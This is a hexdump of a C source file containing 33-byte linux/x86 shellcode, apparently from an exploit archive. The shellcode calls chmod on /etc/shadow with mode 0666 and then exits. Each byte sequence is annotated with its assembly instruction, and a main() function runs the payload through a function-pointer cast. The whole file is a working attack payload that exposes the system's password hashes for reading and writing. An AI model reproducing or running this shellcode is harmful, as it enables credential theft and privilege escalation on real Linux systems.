00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 20 0d 0a 2f  2a 0d 0a 20 20 20 20 6c  |h>.. ../*..    l|
00000020  69 6e 75 78 2f 78 38 36  20 3b 20 63 68 6d 6f 64  |inux/x86 ; chmod|
00000030  28 2f 65 74 63 2f 73 68  61 64 6f 77 2c 20 30 36  |(/etc/shadow, 06|
00000040  36 36 29 20 26 20 65 78  69 74 28 29 20 33 33 20  |66) & exit() 33 |
00000050  62 79 74 65 73 0d 0a 20  20 20 20 77 72 69 74 74  |bytes..    writt|
00000060  65 6e 20 62 79 20 6b 61  30 78 20 2d 20 3c 6b 61  |en by ka0x - <ka|
00000070  30 78 30 31 5b 61 6c 74  2b 36 34 5d 67 6d 61 69  |0x01[alt+64]gmai|
00000080  6c 2e 63 6f 6d 3e 0d 0a  20 20 20 20 6c 75 6e 20  |l.com>..    lun |
00000090  73 65 70 20 32 31 20 31  37 3a 31 33 3a 32 35 20  |sep 21 17:13:25 |
000000a0  43 45 53 54 20 32 30 30  39 0d 0a 20 0d 0a 20 20  |CEST 2009.. ..  |
000000b0  20 20 67 72 65 65 74 73  3a 20 61 6e 30 64 65 2c  |  greets: an0de,|
000000c0  20 50 69 6b 65 72 2c 20  78 61 72 6e 75 7a 2c 20  | Piker, xarnuz, |
000000d0  4e 75 6c 6c 57 61 76 65  30 37 2c 20 50 65 70 65  |NullWave07, Pepe|
000000e0  6c 75 78 2c 20 4a 6f 73  53 2c 20 73 63 68 33 6d  |lux, JosS, sch3m|
000000f0  34 2c 20 54 72 61 6e 63  65 6b 20 61 6e 64 20 6f  |4, Trancek and o|
00000100  74 68 65 72 73 21 0d 0a  20 0d 0a 2a 2f 0d 0a 20  |thers!.. ..*/.. |
00000110  0d 0a 69 6e 74 20 6d 61  69 6e 28 29 0d 0a 7b 0d  |..int main()..{.|
00000120  0a 20 0d 0a 20 20 20 20  63 68 61 72 20 73 68 65  |. ..    char she|
00000130  6c 6c 63 6f 64 65 5b 5d  20 3d 0d 0a 20 20 20 20  |llcode[] =..    |
00000140  20 20 20 20 20 20 20 20  22 5c 78 33 31 5c 78 63  |        "\x31\xc|
00000150  30 22 20 20 20 20 20 20  20 20 20 20 2f 2f 20 78  |0"          // x|
00000160  6f 72 20 65 61 78 2c 65  61 78 0d 0a 20 20 20 20  |or eax,eax..    |
00000170  20 20 20 20 20 20 20 20  22 5c 78 35 30 22 20 20  |        "\x50"  |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000190  75 73 68 20 65 61 78 0d  0a 20 20 20 20 20 20 20  |ush eax..       |
000001a0  20 20 20 20 20 22 5c 78  36 38 5c 78 36 31 5c 78  |     "\x68\x61\x|
000001b0  36 34 5c 78 36 66 5c 78  37 37 22 20 20 20 20 20  |64\x6f\x77"     |
000001c0  20 2f 2f 20 70 75 73 68  20 64 77 6f 72 64 20 30  | // push dword 0|
000001d0  78 37 37 36 66 36 34 36  31 0d 0a 20 20 20 20 20  |x776f6461..     |
000001e0  20 20 20 20 20 20 20 22  5c 78 36 38 5c 78 32 66  |       "\x68\x2f|
000001f0  5c 78 32 66 5c 78 37 33  5c 78 36 38 22 20 20 20  |\x2f\x73\x68"   |
00000200  20 20 20 2f 2f 20 70 75  73 68 20 64 77 6f 72 64  |   // push dword|
00000210  20 30 78 36 38 37 33 32  66 32 66 0d 0a 20 20 20  | 0x68732f2f..   |
00000220  20 20 20 20 20 20 20 20  20 22 5c 78 36 38 5c 78  |         "\x68\x|
00000230  32 66 5c 78 36 35 5c 78  37 34 5c 78 36 33 22 20  |2f\x65\x74\x63" |
00000240  20 20 20 20 20 2f 2f 20  70 75 73 68 20 64 77 6f  |     // push dwo|
00000250  72 64 20 30 78 36 33 37  34 36 35 32 66 0d 0a 20  |rd 0x6374652f.. |
00000260  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 38 39  |           "\x89|
00000270  5c 78 65 33 22 20 20 20  20 20 20 20 20 20 20 2f  |\xe3"          /|
00000280  2f 20 6d 6f 76 20 65 62  78 2c 65 73 70 0d 0a 20  |/ mov ebx,esp.. |
00000290  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 36 36  |           "\x66|
000002a0  5c 78 36 38 5c 78 62 36  5c 78 30 31 22 20 20 20  |\x68\xb6\x01"   |
000002b0  20 20 20 2f 2f 20 70 75  73 68 20 77 6f 72 64 20  |   // push word |
000002c0  30 78 31 62 36 0d 0a 20  20 20 20 20 20 20 20 20  |0x1b6..         |
000002d0  20 20 20 22 5c 78 35 39  22 20 20 20 20 20 20 20  |   "\x59"       |
000002e0  20 20 20 20 20 20 20 2f  2f 20 70 6f 70 20 65 63  |       // pop ec|
000002f0  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |x..            "|
00000300  5c 78 62 30 5c 78 30 66  22 20 20 20 20 20 20 20  |\xb0\x0f"       |
00000310  20 20 20 2f 2f 20 6d 6f  76 20 61 6c 2c 30 78 66  |   // mov al,0xf|
00000320  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |..            "\|
00000330  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 20 20  |xcd\x80"        |
00000340  20 20 2f 2f 20 69 6e 74  20 30 78 38 30 0d 0a 20  |  // int 0x80.. |
00000350  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 62 30  |           "\xb0|
00000360  5c 78 30 31 22 20 20 20  20 20 20 20 20 20 20 2f  |\x01"          /|
00000370  2f 20 6d 6f 76 20 61 6c  2c 30 78 31 0d 0a 20 20  |/ mov al,0x1..  |
00000380  20 20 20 20 20 20 20 20  20 20 22 5c 78 63 64 5c  |          "\xcd\|
00000390  78 38 30 22 3b 20 20 20  20 20 20 20 20 20 2f 2f  |x80";         //|
000003a0  20 69 6e 74 20 30 78 38  30 0d 0a 20 0d 0a 20 20  | int 0x80.. ..  |
000003b0  20 20 70 72 69 6e 74 66  28 22 5b 2a 5d 20 53 68  |  printf("[*] Sh|
000003c0  65 6c 6c 43 6f 64 65 20  73 69 7a 65 20 28 62 79  |ellCode size (by|
000003d0  74 65 73 29 3a 20 25 64  5c 6e 5c 6e 22 2c 20 73  |tes): %d\n\n", s|
000003e0  69 7a 65 6f 66 28 73 68  65 6c 6c 63 6f 64 65 29  |izeof(shellcode)|
000003f0  2d 31 20 29 3b 0d 0a 20  20 20 20 28 2a 28 76 6f  |-1 );..    (*(vo|
00000400  69 64 28 2a 29 28 29 29  20 73 68 65 6c 6c 63 6f  |id(*)()) shellco|
00000410  64 65 29 28 29 3b 0d 0a  20 20 20 20 20 0d 0a 20  |de)();..     .. |
00000420  20 20 20 72 65 74 75 72  6e 20 30 3b 0d 0a 7d     |   return 0;..}|
0000042f
